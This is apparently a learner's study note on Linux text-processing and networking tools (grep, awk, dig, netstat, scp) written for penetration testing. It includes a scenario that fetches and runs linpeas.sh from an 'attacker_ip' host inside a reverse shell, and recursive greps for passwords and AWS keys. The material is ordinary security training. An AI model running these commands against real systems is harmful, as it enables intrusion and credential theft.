# 🔍 07 - More Utilities: Text Processing & Networking

## Status: 🟢 Completed

---

> ### 🧠 The Big Picture
> When you compromise a real server, there's no graphical interface — data lives as **files and logs**. You're searching for a needle (a password, an open port, a vulnerability) inside a haystack. **Text processing tools** (`grep`, `awk`) are the magnet that pulls that needle out in seconds. **Networking tools** are your eyes and ears — telling you who this server is talking to, and who's talking to it.
>
> If you don't have a way to filter through a massive amount of output (an nmap result, a huge log file, thousands of lines in `/etc/passwd` on a machine with hundreds of users), you'll waste your entire engagement reading manually. `grep` is your way of saying: *"Give me only the lines containing this word, and throw away the rest."*

### 📍 Where This Shows Up in a Pentester's Life

| Phase | Application |
|---|---|
| **🔍 Recon & Enumeration** | What ports are open? Who's connected to the server? |
| **⛏️ Data Mining** | You find a file with a million lines — you filter it down to just the emails and passwords. |
| **📤 Exfiltration** | Stealing data off the server to your machine, or uploading your payload onto theirs. |

---

## 🧲 Part 1: `grep` — The Most Important Filtering Tool of Your Career

### The Essential Commands to Memorize by Heart

```bash
grep "pattern" file.txt          # standard search
grep -i "pattern" file.txt       # case-insensitive
grep -v "pattern" file.txt       # invert match (everything WITHOUT the word)
grep -r "pattern" /path/         # recursive — search every file and subfolder
grep -n "pattern" file.txt       # show line numbers
grep -c "pattern" file.txt       # show only the count of matching lines
grep -o "pattern" file.txt       # show only the matched part, not the full line
grep -E "regex" file.txt         # extended regex (covered in detail in the upcoming Regex lesson)
```

### 🔬 Try It Now

```bash
grep -i "error" /var/log/auth.log
```
Expected result: every line containing the word "error" in any capitalization (Error, ERROR, error).

💡 Why this matters: this is the very first command you run in any log analysis.

### 🧨 The Real Security Gold — grep -r in Bug Bounty
The single most valuable use of this entire section during recon: recursively hunting for secrets.

```bash
grep -r "api_key" /var/www/html/ 2>/dev/null
grep -r "password" /var/www/html/ --include="*.php" 2>/dev/null
grep -rE "(AKIA[0-9A-Z]{16})" /var/www/html/ 2>/dev/null   # hunting for AWS keys
```

### 🔗 Combining grep With Pipes — The Real Power

```bash
nmap -p- target.com | grep open
```
This is exactly the first line you type after any nmap scan, to isolate just the open ports out of an ocean of output.

```bash
cat /etc/passwd | grep -v "nologin\|false"
```
As covered before, this filters down to only the users who have a real, usable shell.

---

## 🔢 Part 2: sort, uniq, wc — A Powerful Trio
Their one truly important real-world use: cleaning up recon results.

```bash
sort file.txt              # alphabetical sort
sort -n file.txt            # numerical sort
sort -r file.txt            # reverse sort
uniq file.txt               # removes only ADJACENT duplicates (must sort first)
sort file.txt | uniq        # the correct way to remove ALL duplicates
wc -l file.txt              # count the number of lines
```

---

## ✂️ Part 3: awk — Just What You'll Actually Need, Not the Full Language
`awk` splits every line into "columns" (fields) based on a delimiter (default: space). `$1` = first column, `$2` = second, and so on. `$0` = the entire line.

**The Pattern You'll Use Most in Your Life**
```bash
command | awk '{print $2}'
```

---

## 🔁 Part 4: sed — Just the Basic Replacement

```bash
sed 's/old/new/' file.txt      # replaces the first match on each line
sed 's/old/new/g' file.txt     # replaces ALL matches (global)
sed -i 's/old/new/g' file.txt  # -i edits the file directly (in-place)
```

---

## 🔤 Part 5: tr — Two Lines and You're Done

```bash
cat file.txt | tr 'a-z' 'A-Z'    # convert to uppercase
cat file.txt | tr -d ' '          # delete all spaces
```

---

## 🌐 Part 6: Networking Commands — Just the Ones You'll Actually Use

### ping — One Line
```bash
ping -c 4 target.com
```

### 🎯 dig and nslookup — The Most Important Tools in This Lesson for Your Goals
These are practically the heart of DNS Reconnaissance in web app pentesting.

Why `dig` beats `nslookup`: `dig` gives you far more raw detail, and it's the professional standard used in real recon.

```bash
dig target.com
dig target.com MX          # mail records
dig target.com NS          # nameservers
dig target.com TXT         # text records (sometimes containing sensitive info like SPF records or verification tokens)
dig -x 8.8.8.8              # reverse lookup
```

🎬 **Real-World Scenario (Subdomain Enumeration — The Foundation of Any Bug Bounty)**
```bash
dig target.com ANY
```

### 👁️ netstat — Seeing Open Connections
```bash
netstat -tulpn
```

| Flag | Meaning |
|---|---|
| `t` | TCP |
| `u` | UDP |
| `l` | Listening only (open ports waiting for a connection) |
| `p` | Show the process name |
| `n` | Show numbers instead of names (faster) |

🔴 **From the Red Team's Perspective (Post-Exploitation):** After landing a shell on a machine, `netstat -tulpn` reveals other services running locally that might not be exposed externally (like a database on port 3306, accessible only from localhost). This opens up new ideas for lateral movement or pivoting.

🔵 **From the Blue Team's Perspective:** Regularly checking `netstat` reveals any suspicious reverse shell listener or backdoor waiting for connections on an unusual port.

> ⚠️ **Important Note:** On modern systems, `netstat` is being deprecated in favor of `ss`:

```bash
ss -tulpn
```
Same function, faster, and available on every modern system. If you land on a machine and `netstat` doesn't exist, use `ss`.

---

## 📤 Part 7: File Transfer — scp and rsync

### scp — Your Essential Tool for Moving Tools and Loot

```bash
scp file.txt user@target:/path/          # upload a file to the target
scp user@target:/path/file.txt .          # pull a file from the target
scp -r folder/ user@target:/path/          # transfer an entire folder
```

🎬 **The Most Important Scenario in Your Professional Life: Transferring Privilege Escalation Tools**
Real-World Scenario (HTB/OSCP Classic):

After landing a shell on a machine, you need to run an enumeration tool like `linpeas.sh`. The professional approach:

```bash
# On your machine (attacker machine)
python3 -m http.server 8000     # start a simple server in the folder containing linpeas.sh

# On the target (inside the reverse shell)
wget http://attacker_ip:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

🤔 **So why not just use scp here?** Because `scp` requires SSH access and a valid password on the target — which usually isn't available on your first foothold (you typically only have a limited reverse shell). `scp` becomes more useful once you have full SSH access (i.e., after you've already obtained real credentials).

🛡️ **From the Blue Team's Perspective:** Any unusual `wget` or `scp` from an internal machine to an unknown external server is a very strong IOC (Indicator of Compromise) that shows up in network traffic monitoring logs.

### rsync — One Important Point
The one thing that matters: `rsync` transfers only the differences, not the entire file — making it ideal for syncing a massive folder later without re-transferring everything from scratch.

```bash
rsync -avz source/ user@target:/destination/
```

---

## ⚠️ Part 8: Line Endings — A Small Gotcha, Not a Full Lesson
This is small, but genuinely will trip you up if you don't know about it — so here it is, condensed into one focused section.

**The Real Problem**
Windows ends every line with `\r\n` (called CRLF), while Linux uses only `\n` (LF). If you write or download a Bash script that originated on Windows and try to run it on Linux:

```bash
./script.sh
```
It'll break, silently and confusingly, unless you convert it first with `dos2unix`.

---

## 🧾 Final Summary

### 🔤 Text Processing

| Command | Purpose |
|---|---|
| `grep "word" file` | Search inside a file. |
| `grep -r "word" /dir` | Search every file inside a directory (for hunting passwords). |
| `awk -F: '{print $1}'` | The scissors — cutting columns (cleaning up user lists or IP addresses). |
| `sort \| uniq` | Always used together. Sort the data first, then strip duplicates. |

### 🌐 Networking

| Command | Purpose |
|---|---|
| `ip a` | What's my address, and what networks am I connected to? |
| `netstat -tulnp` | What ports are currently open on my system? |

### 📤 Exfiltration & Cleanup

| Command | Purpose |
|---|---|
| `scp file user@ip:/path` | Move data to and from the server. |
| `dos2unix script.sh` | Run this before executing any script brought over from Windows. |

### 🔑 Final Wisdom
> *"Linux is noisy and chaotic, and grep is the magnet that pulls the needle out of the haystack, while awk is the scissors that trims away the excess. Your radar is netstat, exposing everything running quietly in the dark. And when you forge your weapon on Windows, wash it with dos2unix before striking with it on Linux — or it'll backfire in your own face."*

---
*This content was studied and written in my own words based on the concepts covered in TCM Security's Linux 101 course. Any errors in explanation or terminology are entirely my own.*
